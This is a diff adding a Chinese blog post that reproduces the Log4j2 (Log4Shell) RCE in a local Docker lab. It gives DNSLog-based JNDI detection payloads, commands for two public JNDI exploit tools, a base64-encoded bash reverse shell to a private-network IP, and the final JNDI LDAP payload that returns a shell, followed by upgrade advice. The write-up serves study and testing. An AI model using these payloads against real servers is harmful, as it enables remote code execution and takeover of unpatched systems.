@@ -1,0 +1,208 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>Apache Log4j2漏洞复现 | Mari0er&#39;s Blog</title>
+<meta name="description" content="">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://mari0er.top/favicon.ico?v=1768205765236">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://mari0er.top/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://mari0er.top">
+        <img class="avatar" src="https://mari0er.top/images/avatar.png?v=1768205765236" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://mari0er.top">
+        <h1 class="site-title">Mari0er&#39;s Blog</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="https://mari0er.top/post/about.html" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+            <div class="feature-container" style="background-image: url('https://tuchuang.looklook.workers.dev/2424/logo.png')">
+            </div>
+          
+          <h2 class="post-title">Apache Log4j2漏洞复现</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2021-12-14</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://mari0er.top/tag/log4j2/">
+                    log4j2
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content">
+            <p>  最近爆出的Log4j2漏洞，堪比当年的MS17-010，危害范围广，利用成本低，朋友圈直接刷爆，简直一大杀器。这里记录一下复现过程，<s>安服可能用到，备忘。</s></p>
+<!-- more -->
+<h3 id="0x01-漏洞原理">0x01 漏洞原理</h3>
+<p>  不是开发也不是挖洞大佬，我的理解是开源日志框架Log4j2存在安全漏洞，在特定条件下会把用户的输入直接执行导致RCE。具体漏洞分析和绕过可以看看这篇<a href="https://xz.aliyun.com/t/10649">Apache Log4j2从RCE到RC1绕过</a>。</p>
+<h3 id="0x02-dnslog">0x02 DNSLog</h3>
+<p>  刷屏最直观的是一张DNSLog的截图，这是啥？DNSLog是一个公共的DNS平台，当有人请求分配给你的2级域名时，平台会自动记下解析记录。所以这有啥用？？   因为Log4j2漏洞没有回显，无法判断命令是否执行，这时输入你的2级域名(<s>不是单纯输入域名，这里简化</s>)，若DNSlog平台有解析记录，表明目标请求了你的域名，存在漏洞。<br>
+<strong>注意：能否RCE还和目标JDK版本有关系，不是说有解析记录就一定可以远程命令执行</strong></p>
+<h3 id="0x03-环境搭建">0x03 环境搭建</h3>
+<p>这里选择Docker环境本地搭建，之后浏览器直接打开http://127.0.0.1:8082 即可。</p>
+<blockquote>
+<p>docker pull vulfocus/log4j2-rce-2021-12-09:latest<br>
+docker run -d -p 8082:8080 vulfocus/log4j2-rce-2021-12-09:latest</p>
+</blockquote>
+<p>根据靶机说明，访问http://127.0.0.1:8082/hello 页面，抓包后修改以下三处参数即可。</p>
+<blockquote>
+<p>1.修改GET为POST<br>
+2.添加请求头Content-Type: application/x-www-form-urlencoded<br>
+3.最后加上payload=${jndi:ldap://xxx.dnslog.cn}</p>
+</blockquote>
+<p>发送Payload后可以看到，DNS平台上有了解析记录，说明测试环境请求了你的域名，存在漏洞。<br>
+<img src="https://tuchuang.looklook.workers.dev/2424/dnslog1.png" alt="dnslog" loading="lazy"></p>
+<h3 id="0x04-利用工具">0x04 利用工具</h3>
+<p>一键工具需要你有一台公网VPS，目标从VPS下载文件进行命令执行。<strong>(内网kali举例)</strong><br>
+<strong><a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a></strong><br>
+首先你需要将命令进行Base64加密，之后根据用法-C 【命令】 -A 【IP】进行利用</p>
+<pre><code>原：bash -i &gt;&amp; /dev/tcp/192.168.200.160/8889 0&gt;&amp;1
+加密:YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMC4xNjAvODg4OSAwPiYx
+</code></pre>
+<pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMC4xNjAvODg4OSAwPiYx}|{base64,-d}|bash&quot; -A 192.168.200.160
+</code></pre>
+<p>根据回显，可以看到需要用到<strong>8180，1099，1389</strong>端口，避免上述端口被占用。<br>
+<img src="https://tuchuang.looklook.workers.dev/2424/JNDI-Injection-Exploit.png" alt="JNDI" loading="lazy"><br>
+之后直接将短链接放入Payload中即可反弹回shell，经测试Docker靶机需要用到<strong>jndi:rmi</strong>的短链接，其他目标环境没有测试。<br>
+<img src="https://tuchuang.looklook.workers.dev/2424/shell.png" alt="shell" loading="lazy"></p>
+<p><strong><a href="https://github.com/feihong-cs/JNDIExploit/releases">JNDIExploit</a></strong><br>
+这个工具将命令写在了请求的url中，首先还是Base64加密，之后如果通过BP发包还需要进行<strong>URL加密两次</strong>，即将&quot;+&quot;替换成&quot;&quot;%252B&quot;&quot;，&quot;=&quot;替换成&quot;%253D&quot;。</p>
+<pre><code>原：bash -i &gt;&amp; /dev/tcp/192.168.200.112/8889 0&gt;&amp;1
+加密：YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMC4xMTIvODg4OSAwPiYx
+=&gt;：YmFzaCAtaSA%252BJiAvZGV2L3RjcC8xOTIuMTY4LjIwMC4xMTIvODg4OSAwPiYx
+</code></pre>
+<p>启动JNDIExploit，可以看到需要用到<strong>8080，1389</strong>端口，避免端口被占用。</p>
+<blockquote>
+<p>java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.200.112</p>
+</blockquote>
+<p><img src="https://tuchuang.looklook.workers.dev/2424/123.png" alt="JNDIExploit" loading="lazy"><br>
+之后将加密后的命令写入Payload中即可执行命令。<br>
+<strong>Payload：</strong></p>
+<pre><code> ${jndi:ldap://192.168.200.112:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%252BJiAvZGV2L3RjcC8xOTIuMTY4LjIwMC4xMTIvODg4OSAwPiYx}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://tuchuang.looklook.workers.dev/2424/shell2.png" alt="shell2" loading="lazy"></figure>
+<h3 id="0x05-修复建议">0x05 修复建议</h3>
+<p>目前，Apache官方已发布新版本完成漏洞修复，建议用户尽快进行自查，根据Java版本及时升级至最新版本：https://logging.apache.org/log4j/2.x/download.html</p>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://mari0er.top/post/monitor.html/">
+              <h3 class="post-title">
+                下一篇：网站运行状态监控
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan"></div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  待人友善是修养 独来独往是性格 | <a class="rss" href="https://mari0er.top/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
